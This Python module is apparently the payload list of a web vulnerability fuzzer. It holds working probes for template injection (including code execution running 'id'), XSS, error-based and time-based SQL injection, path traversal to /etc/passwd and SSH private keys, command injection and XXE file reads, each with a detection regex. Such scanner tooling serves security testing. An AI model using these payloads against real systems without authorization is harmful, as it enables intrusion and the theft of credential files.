"""Reflection/injection payloads - verbatim port of ``App\\Fuzzing\\Payloads``.

Each entry is a dict with:
  - ``class``        finding class (SSTI/XSS/SQLI/LFI/RCE/XXE)
  - ``severity``     always "high" here
  - ``payload``      the template; ``EXPRESSION`` / ``{RANDOM}`` / ``{TIMEOUT}``
                     placeholders are resolved at fuzz time
  - ``result``       expected reflected string (or "EXPRESSION_VALUE")
  - ``pattern``      needle/regex proving the hit
  - ``pattern_type`` "string" (default), "regex", or "timing"
  - ``delay``        sleep seconds for timing payloads
"""

# Error-based SQLi fingerprint - one big alternation reused by every probe.
SQL_ERROR_PATTERN = (
    r"(?i)PDOException|SQLSTATE\[|SQL syntax.*?MySQL|Warning.*?\Wmysqli?_|"
    r"MySQLSyntaxErrorException|check the manual that (corresponds to|fits) "
    r"your (MySQL|MariaDB) server version|Unknown column .+ in .field list.|"
    r"com\.mysql\.jdbc|PostgreSQL.*?ERROR|Warning.*?\Wpg_|Npgsql\.|"
    r"PG::SyntaxError:|org\.postgresql\.util\.PSQLException|"
    r"ERROR:\s\ssyntax error at or near|Driver.*? SQL[\-\_\ ]*Server|"
    r"OLE DB.*? SQL Server|Warning.*?\W(mssql|sqlsrv)_|"
    r"Unclosed quotation mark after the character string|\bORA-\d{5}|"
    r"CLI Driver.*?DB2|DB2 SQL error|org\.firebirdsql\.jdbc|"
    r"SQLite/JDBCDriver|SQLite\.Exception|SQLITE_ERROR|"
    r"sqlite3\.OperationalError|org\.apache\.derby|ERROR 42X01"
)

# Command-output fingerprint shared by RCE/SSTI "id" payloads.
_ID_PATTERN = r"uid=\d+\([a-zA-Z0-9_-]+\)\s*(gid=|groups=)"
_PASSWD_PATTERN = r"root:.*:0:0:"


def _ssti(payload: str) -> dict:
    return {"class": "SSTI", "severity": "high", "payload": payload, "result": "EXPRESSION_VALUE"}


def _sqli_error(payload: str) -> dict:
    return {
        "class": "SQLI",
        "severity": "high",
        "payload": payload,
        "pattern": SQL_ERROR_PATTERN,
        "pattern_type": "regex",
    }


def _sqli_timing(payload: str) -> dict:
    return {"class": "SQLI", "severity": "high", "payload": payload, "pattern_type": "timing", "delay": 5}


def _lfi(payload: str, pattern: str, regex: bool = True) -> dict:
    entry = {"class": "LFI", "severity": "high", "payload": payload, "pattern": pattern}
    if regex:
        entry["pattern_type"] = "regex"
    return entry


def _rce(payload: str, pattern: str) -> dict:
    return {"class": "RCE", "severity": "high", "payload": payload, "pattern": pattern, "pattern_type": "regex"}


def _xxe(payload: str, pattern: str, regex: bool = False) -> dict:
    entry = {"class": "XXE", "severity": "high", "payload": payload, "pattern": pattern}
    if regex:
        entry["pattern_type"] = "regex"
    return entry


def all_payloads() -> list[dict]:
    payloads: list[dict] = []

    # -- SSTI (expression-evaluation) --------------------------------------
    for tpl in [
        "{{EXPRESSION}}",
        "${EXPRESSION}",
        "<%= EXPRESSION %>",
        "#{EXPRESSION}",
        "{{{EXPRESSION}}}",
        "${{EXPRESSION}}",
        "[[EXPRESSION]]",
        "{{=EXPRESSION}}",
        "#set($x=EXPRESSION)${x}",
        "@(EXPRESSION)",
        "{@EXPRESSION}",
        "*{EXPRESSION}",
        "[% EXPRESSION %]",
        "[%= EXPRESSION %]",
        "<?=EXPRESSION?>",
        "${= EXPRESSION}",
        "{{# EXPRESSION }}",
        "<% EXPRESSION %>",
        "<# EXPRESSION #>",
        "[- EXPRESSION -]",
        "[=EXPRESSION]",
        "]][[ EXPRESSION ]]",
        "{EXPRESSION}",
        "{{% EXPRESSION %}}",
        "{{<% EXPRESSION %>}}",
        "${xyz|EXPRESSION}",
        "}}{{EXPRESSION}}{{",
    ]:
        payloads.append(_ssti(tpl))

    # -- SSTI (code-execution) ---------------------------------------------
    payloads += [
        {
            "class": "SSTI",
            "severity": "high",
            "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "pattern": _ID_PATTERN,
            "pattern_type": "regex",
        },
        {
            "class": "SSTI",
            "severity": "high",
            "payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            "pattern": _ID_PATTERN,
            "pattern_type": "regex",
        },
        {
            "class": "SSTI",
            "severity": "high",
            "payload": "<%= system('id') %>",
            "pattern": _ID_PATTERN,
            "pattern_type": "regex",
        },
        {
            "class": "SSTI",
            "severity": "high",
            "payload": "*{T(java.lang.Runtime).getRuntime().exec('id')}",
            "pattern": _ID_PATTERN,
            "pattern_type": "regex",
        },
    ]

    # -- XSS (reflected) ---------------------------------------------------
    for payload in [
        "<script>alert({RANDOM})</script>",
        '"><img src=x onerror=alert({RANDOM})>',
        "'><svg onload=alert({RANDOM})>",
        "</textarea><script>alert({RANDOM})</script>",
        '" onmouseover="alert({RANDOM})"',
        "\"'><{RANDOM}",
    ]:
        payloads.append(
            {"class": "XSS", "severity": "high", "payload": payload, "pattern": payload}
        )

    # -- SQLi (error-based) ------------------------------------------------
    for payload in ["'", '"', ";", "' OR 1=1--", "' UNION SELECT NULL--"]:
        payloads.append(_sqli_error(payload))

    # -- SQLi (time-based blind) -------------------------------------------
    for payload in [
        # MySQL / MariaDB - integer context
        "1 AND SLEEP({TIMEOUT})",
        "1 AND (SELECT*FROM(SELECT(SLEEP({TIMEOUT})))a)",
        "1 AND 0 IN (SELECT SLEEP({TIMEOUT}))-- -",
        # MySQL / MariaDB - single-quote string context
        "1' AND SLEEP({TIMEOUT})-- -",
        "1' AND SLEEP({TIMEOUT}) AND '1'='1",
        "1' AND 0 IN (SELECT SLEEP({TIMEOUT})) AND ''='",
        # MySQL - XOR bypass
        "1' XOR(IF(NOW()=SYSDATE(),SLEEP({TIMEOUT}),0))XOR'Z",
        # MySQL / MariaDB - double-quote string context
        '1" AND SLEEP({TIMEOUT}) AND "1"="1',
        # PostgreSQL
        "1 OR pg_sleep({TIMEOUT})-- -",
        "1; SELECT pg_sleep({TIMEOUT})-- -",
        "1'; SELECT pg_sleep({TIMEOUT})-- -",
        # MSSQL
        "1; WAITFOR DELAY '0:0:{TIMEOUT}'-- -",
        "1'; WAITFOR DELAY '0:0:{TIMEOUT}'-- -",
        '1"; WAITFOR DELAY \'0:0:{TIMEOUT}\'-- -',
    ]:
        payloads.append(_sqli_timing(payload))

    # -- LFI / path traversal ----------------------------------------------
    for payload in [
        "/etc/passwd",
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "/../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "%252e%252e%252fetc%252fpasswd",
    ]:
        payloads.append(_lfi(payload, _PASSWD_PATTERN, regex=True))
    payloads.append(_lfi("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vdDp4Og", regex=False))
    payloads.append(_lfi("../../../etc/passwd%00", _PASSWD_PATTERN, regex=True))
    payloads.append(_lfi("../../../../../../../../../Windows/win.ini", "for 16-bit app support", regex=False))
    payloads.append(_lfi("/proc/self/environ", r"(?i)(HTTP_USER_AGENT|DOCUMENT_ROOT)", regex=True))
    payloads.append(_lfi("/root/.ssh/id_rsa", r"-----BEGIN .* PRIVATE KEY-----", regex=True))

    # -- RCE (command injection) -------------------------------------------
    for payload in [";id", "|id", "&&id", "$(id)", "`id`", "\nid"]:
        payloads.append(_rce(payload, _ID_PATTERN))
    for payload in ["; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd", "; cat${IFS}/etc/passwd"]:
        payloads.append(_rce(payload, _PASSWD_PATTERN))

    # -- XXE ---------------------------------------------------------------
    payloads.append(_xxe(
        '<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><x>&xxe;</x>',
        r"root:.*?:[0-9]*:[0-9]*:", regex=True,
    ))
    payloads.append(_xxe(
        '<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><x>&xxe;</x>',
        "for 16-bit app support",
    ))
    payloads.append(_xxe(
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY >'
        '<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
        "root:x:0:0:",
    ))
    payloads.append(_xxe(
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///etc/passwd"/></foo>',
        _PASSWD_PATTERN, regex=True,
    ))
    payloads.append(_xxe(
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///C:/Windows/win.ini"/></foo>',
        "for 16-bit app support",
    ))
    payloads.append(_xxe(
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file://../../../../../../etc/passwd"/></foo>',
        _PASSWD_PATTERN, regex=True,
    ))

    return payloads
